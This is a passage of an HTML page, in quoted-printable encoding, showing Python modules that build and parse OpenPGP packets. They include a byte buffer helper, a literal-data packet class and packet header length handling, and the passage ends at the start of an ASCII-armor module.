style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True=
</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i32be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">4</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True</s=
pan><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i32le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">4</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True=
</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i64be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">8</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True</s=
pan><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i64le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">8</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True=
</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u8</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">signed</span><span style=3D"colo=
r:#FF7B72">=3D</span><span style=3D"color:#79C0FF">False</span><span style=
=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u16be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">2</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">False</=
span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u16le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">2</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">Fals=
e</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u32be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">4</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">False</=
span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u32le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">4</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">Fals=
e</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u64be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">8</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">False</=
span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_u64le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">8</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">Fals=
e</span><span style=3D"color:#E6EDF3">)</span></span></code></pre><!----> <=
p>literal_data.py</p> <!----><pre class=3D"shiki github-dark-default" style=
=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span clas=
s=3D"line"><span style=3D"color:#FF7B72">from</span><span style=3D"color:#E=
6EDF3"> datetime </span><span style=3D"color:#FF7B72">import</span><span st=
yle=3D"color:#E6EDF3"> datetime</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
=3D"color:#E6EDF3"> enum </span><span style=3D"color:#FF7B72">import</span>=
<span style=3D"color:#E6EDF3"> Enum</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
=3D"color:#E6EDF3"> buffer </span><span style=3D"color:#FF7B72">import</spa=
n><span style=3D"color:#E6EDF3"> Buffer</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> LiteralDataEncoding</span><span style=3D"color:#E6EDF3"=
>(</span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#79C0FF">Enum</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Binary </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> ord</span>=
<span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"b"</sp=
an><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    UTF8</span><span sty=
le=3D"color:#FF7B72"> =3D</span><span style=3D"color:#79C0FF"> ord</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"u"</span=
><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Text </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> ord</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"t"</span=
><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> LiteralDataPacket</span><span style=3D"color:#E6EDF3">:=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    encoding: LiteralDat=
aEncoding </span><span style=3D"color:#FF7B72">|</span><span style=3D"color=
:#79C0FF"> None</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    file_name: </span><s=
pan style=3D"color:#79C0FF">str</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    metadata: </span><sp=
an style=3D"color:#79C0FF">int</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    data: </span><span s=
tyle=3D"color:#79C0FF">bytes</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        self,</span></sp=
an>
<span class=3D"line"><span style=3D"color:#E6EDF3">        encoding: Litera=
lDataEncoding </span><span style=3D"color:#FF7B72">|</span><span style=3D"c=
olor:#79C0FF"> None</span><span style=3D"color:#FF7B72"> =3D</span><span st=
yle=3D"color:#79C0FF"> None</span><span style=3D"color:#E6EDF3">,</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">        file_name: </spa=
n><span style=3D"color:#79C0FF">str</span><span style=3D"color:#FF7B72"> =
=3D</span><span style=3D"color:#A5D6FF"> ""</span><span style=3D"color:#E6E=
DF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        metadata: </span=
><span style=3D"color:#79C0FF">int</span><span style=3D"color:#FF7B72"> =3D=
</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3"=
>,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        data: </span><sp=
an style=3D"color:#79C0FF">bytes</span><span style=3D"color:#FF7B72"> =3D</=
span><span style=3D"color:#FF7B72"> b</span><span style=3D"color:#A5D6FF">"=
"</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    ):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.encoding </span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#E6EDF3"> encoding</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.file_name </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#E6EDF3"> file_name</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.metadata </span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#E6EDF3"> metadata</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.data </span><span style=3D"color:#FF7B72">=3D</sp=
an><span style=3D"color:#E6EDF3"> data</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __str__</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        output </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "</spa=
n><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">=
"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        output </span><s=
pan style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> f</sp=
an><span style=3D"color:#A5D6FF">"    encoding: </span><span style=3D"color=
:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">self</span><span style=
=3D"color:#E6EDF3">.encoding</span><span style=3D"color:#FF7B72">&#125;</sp=
an><span style=3D"color:#A5D6FF">,</span><span style=3D"color:#FF7B72">&#92=
;n</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        output </span><s=
pan style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> f</sp=
an><span style=3D"color:#A5D6FF">"    file_name: </span><span style=3D"colo=
r:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">repr</span><span styl=
e=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">self</span><span =
style=3D"color:#E6EDF3">.file_name)</span><span style=3D"color:#FF7B72">&#1=
25;</span><span style=3D"color:#A5D6FF">,</span><span style=3D"color:#FF7B7=
2">&#92;n</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        timestamp </span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> dat=
etime.fromtimestamp(</span><span style=3D"color:#79C0FF">self</span><span s=
tyle=3D"color:#E6EDF3">.metadata)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        output </span><s=
pan style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> f</sp=
an><span style=3D"color:#A5D6FF">"    metadata: 0x</span><span style=3D"col=
or:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">hex</span><span styl=
e=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">self</span><span =
style=3D"color:#E6EDF3">.metadata)</span><span style=3D"color:#FF7B72">&#12=
5;</span><span style=3D"color:#A5D6FF"> (</span><span style=3D"color:#FF7B7=
2">&#123;</span><span style=3D"color:#E6EDF3">timestamp</span><span style=
=3D"color:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">),</span><spa=
n style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">"</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        output </span><s=
pan style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> f</sp=
an><span style=3D"color:#A5D6FF">"    data(</span><span style=3D"color:#FF7=
B72">&#123;</span><span style=3D"color:#79C0FF">len</span><span style=3D"co=
lor:#E6EDF3">(</span><span style=3D"color:#79C0FF">self</span><span style=
=3D"color:#E6EDF3">.data)</span><span style=3D"color:#FF7B72">&#125;</span>=
<span style=3D"color:#A5D6FF">): </span><span style=3D"color:#FF7B72">&#123=
;</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6ED=
F3">.data.hex()</span><span style=3D"color:#FF7B72">&#125;</span><span styl=
e=3D"color:#A5D6FF">,</span><span style=3D"color:#FF7B72">&#92;n</span><spa=
n style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#E6EDF3"> output</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __bytes__</span><span style=3D"color:#E6EDF3">(self) -=
> </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"color:#E6=
EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> Buffer=
()</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer.push_u8(<=
/span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6EDF3=
">.encoding)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer.push_u8(<=
/span><span style=3D"color:#79C0FF">len</span><span style=3D"color:#E6EDF3"=
>(</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6E=
DF3">.file_name))</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer.push_utf8=
(</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6ED=
F3">.file_name)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer.push_u32b=
e(</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6E=
DF3">.metadata)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        buffer.push_byte=
s(</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6E=
DF3">.data)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> bytes</span><span style=3D"color:#E6EDF3">(buff=
er)</span></span></code></pre><!----> <p>packets.py</p> <!----><pre class=
=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6e=
df3" tabindex=3D"0"><code><span class=3D"line"><span>from base64 import b64=
decode, b64encode</span></span>
<span class=3D"line"><span>from enum import Enum</span></span>
<span class=3D"line"><span>from sys import argv</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>from buffer import Buffer</span></span>
<span class=3D"line"><span>from literal_data import LiteralDataEncoding, Li=
teralDataPacket</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>class PacketType(int, Enum):</span></span>
<span class=3D"line"><span>    PublicKeyEncryptedSessionKey =3D 1</span></s=
pan>
<span class=3D"line"><span>    Signature =3D 2</span></span>
<span class=3D"line"><span>    SymmetricKeyEncryptedSessionKey =3D 3</span>=
</span>
<span class=3D"line"><span>    OnePassSignature =3D 4</span></span>
<span class=3D"line"><span>    SecretKey =3D 5</span></span>
<span class=3D"line"><span>    PublicKey =3D 6</span></span>
<span class=3D"line"><span>    SecretSubkey =3D 7</span></span>
<span class=3D"line"><span>    CompressedData =3D 8</span></span>
<span class=3D"line"><span>    SymmetricallyEncryptedData =3D 9</span></spa=
n>
<span class=3D"line"><span>    Marker =3D 10</span></span>
<span class=3D"line"><span>    LiteralData =3D 11</span></span>
<span class=3D"line"><span>    Trust =3D 12</span></span>
<span class=3D"line"><span>    UserID =3D 13</span></span>
<span class=3D"line"><span>    PublicSubkey =3D 14</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    UserAttribute =3D 17</span></span>
<span class=3D"line"><span>    SymmetricallyEncryptedAndIntegrityProtectedD=
ata =3D 18</span></span>
<span class=3D"line"><span>    ModificationDetectionCode =3D 19</span></spa=
n>
<span class=3D"line"><span>    Padding =3D 21</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>class Packet:</span></span>
<span class=3D"line"><span>    legacy: bool</span></span>
<span class=3D"line"><span>    packet_type: PacketType | None</span></span>
<span class=3D"line"><span>    body: LiteralDataPacket | bytes</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def __init__(</span></span>
<span class=3D"line"><span>        self,</span></span>
<span class=3D"line"><span>        legacy: bool =3D False,</span></span>
<span class=3D"line"><span>        packet_type: PacketType | None =3D None,=
</span></span>
<span class=3D"line"><span>        body: LiteralDataPacket | bytes =3D b""<=
/span></span>
<span class=3D"line"><span>    ):</span></span>
<span class=3D"line"><span>        self.legacy =3D legacy</span></span>
<span class=3D"line"><span>        self.packet_type =3D packet_type</span><=
/span>
<span class=3D"line"><span>        self.body =3D body</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def __str__(self) -> str:</span></span>
<span class=3D"line"><span>        prefix =3D "Legacy" if self.legacy else =
""</span></span>
<span class=3D"line"><span>        return f"&#123;prefix&#125;&#123;self.pa=
cket_type&#125;Packet(&#123;self.body&#125;)"</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def __bytes__(self) -> bytes:</span></span>
<span class=3D"line"><span>        buffer =3D Buffer()</span></span>
<span class=3D"line"><span>        raw_body =3D bytes(self.body)</span></sp=
an>
<span class=3D"line"><span>        length =3D len(raw_body)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>        if self.legacy:</span></span>
<span class=3D"line"><span>            length_type =3D 0</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>            if length &#x3C;=3D 0xff:</span></sp=
an>
<span class=3D"line"><span>                length_type =3D 0</span></span>
<span class=3D"line"><span>            elif length &#x3C;=3D 0xffff:</span>=
</span>
<span class=3D"line"><span>                length_type =3D 1</span></span>
<span class=3D"line"><span>            elif length &#x3C;=3D 0xffff_ffff:</=
span></span>
<span class=3D"line"><span>                length_type =3D 2</span></span>
<span class=3D"line"><span>            else:</span></span>
<span class=3D"line"><span>                length_type =3D 3</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>            buffer.push_u8(0x80 + (self.packet_t=
ype.value &#x3C;&#x3C; 2) + length_type)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>            match length_type:</span></span>
<span class=3D"line"><span>                case 0:</span></span>
<span class=3D"line"><span>                    buffer.push_u8(length)</span=
></span>
<span class=3D"line"><span>                case 1:</span></span>
<span class=3D"line"><span>                    buffer.push_u16be(length)</s=
pan></span>
<span class=3D"line"><span>                case 2:</span></span>
<span class=3D"line"><span>                    buffer.push_u32be(length)</s=
pan></span>
<span class=3D"line"><span>                case _:</span></span>
<span class=3D"line"><span>                    raise Exception("Not impleme=
nted")</span></span>
<span class=3D"line"><span>        else:</span></span>
<span class=3D"line"><span>            buffer.push_u8(0xc0 + self.packet_ty=
pe.value)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>            if length &#x3C; 192:</span></span>
<span class=3D"line"><span>                buffer.push_u8(length)</span></s=
pan>
<span class=3D"line"><span>            elif length &#x3C; 8383:</span></spa=
n>
<span class=3D"line"><span>                length -=3D 192</span></span>
<span class=3D"line"><span>                msb =3D (length >> 8) + 192</spa=
n></span>
<span class=3D"line"><span>                lsb =3D length &#x26; 0xff</span=
></span>
<span class=3D"line"><span>                buffer.push_u8(msb)</span></span>
<span class=3D"line"><span>                buffer.push_u8(lsb)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>        buffer.push_bytes(raw_body)</span></span>
<span class=3D"line"><span>        return bytes(buffer)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def from_buffer(self, buffer: Buffer):</span=
></span>
<span class=3D"line"><span>        octed =3D buffer.take_u8()</span></span>
<span class=3D"line"><span>        if octed >=3D 0xc0:</span></span>
<span class=3D"line"><span>            self.legacy =3D False</span></span>
<span class=3D"line"><span>            self.packet_type =3D PacketType(octe=
d &#x26; 0x3f)</span></span>
<span class=3D"line"><span>        elif octed >=3D 0x80:</span></span>
<span class=3D"line"><span>            self.legacy =3D True</span></span>
<span class=3D"line"><span>            self.packet_type =3D PacketType((oct=
ed &#x26; 0x3f) >> 2)</span></span>
<span class=3D"line"><span>        else:</span></span>
<span class=3D"line"><span>            raise Exception(f"Invalid Packet ID:=
 &#123;octed&#125;")</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>        length =3D 0</span></span>
<span class=3D"line"><span>        if self.legacy:</span></span>
<span class=3D"line"><span>            match octed &#x26; 0x03:</span></spa=
n>
<span class=3D"line"><span>                case 0:</span></span>
<span class=3D"line"><span>                    length =3D buffer.take_u8()<=
/span></span>
<span class=3D"line"><span>                case 1:</span></span>
<span class=3D"line"><span>                    length =3D buffer.take_u16be=
()</span></span>
<span class=3D"line"><span>                case 2:</span></span>
<span class=3D"line"><span>                    length =3D buffer.take_u32be=
()</span></span>
<span class=3D"line"><span>                case _:</span></span>
<span class=3D"line"><span>                    raise Exception(f"Indetermin=
ate legacy length is not implemented")</span></span>
<span class=3D"line"><span>        else:</span></span>
<span class=3D"line"><span>            first =3D buffer.take_u8()</span></s=
pan>
<span class=3D"line"><span>            if first &#x3C; 192:</span></span>
<span class=3D"line"><span>                length =3D first</span></span>
<span class=3D"line"><span>            elif first &#x3C; 224:</span></span>
<span class=3D"line"><span>                msb =3D first - 192</span></span>
<span class=3D"line"><span>                lsb =3D buffer.take_u8() + 192</=
span></span>
<span class=3D"line"><span>                length =3D (msb &#x3C;&#x3C; 8) =
+ lsb</span></span>
<span class=3D"line"><span>            elif first =3D=3D 255:</span></span>
<span class=3D"line"><span>                length =3D buffer.take_u32be()</=
span></span>
<span class=3D"line"><span>            else:</span></span>
<span class=3D"line"><span>                raise Exception(f"Partial body l=
ength is not implemented")</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>        data =3D buffer.take_bytes(length)</span=
></span>
<span class=3D"line"><span>        self.body =3D data</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>class Packets:</span></span>
<span class=3D"line"><span>    packets: list[Packet]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def __init__(self, packets: list[Packet] =3D=
 []):</span></span>
<span class=3D"line"><span>        self.packets =3D packets</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def __bytes__(self) -> bytes:</span></span>
<span class=3D"line"><span>        output =3D b""</span></span>
<span class=3D"line"><span>        for packet in self.packets:</span></span>
<span class=3D"line"><span>            output +=3D bytes(packet)</span></sp=
an>
<span class=3D"line"><span>        return output</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def from_buffer(self, buffer: Buffer):</span=
></span>
<span class=3D"line"><span>        while not buffer.is_empty():</span></spa=
n>
<span class=3D"line"><span>            packet =3D Packet()</span></span>
<span class=3D"line"><span>            packet.from_buffer(buffer)</span></s=
pan>
<span class=3D"line"><span>            self.packets.append(packet)</span></=
span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    def from_bytes(self, data: bytes):</span></s=
pan>
<span class=3D"line"><span>        self.from_buffer(Buffer(data))</span></s=
pan></code></pre><!----> <p>armor.py</p> <!----><pre class=3D"shiki github-=
dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"=
0"><code><span class=3D"line"><span style=3D"color:#FF7B72">from</span><spa=
n style=3D"color:#E6EDF3"> base64 </span><span style=3D"color:#FF7B72">impo=
rt</span><span style=3D"color:#E6EDF3"> b64decode, standard_b64encode</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
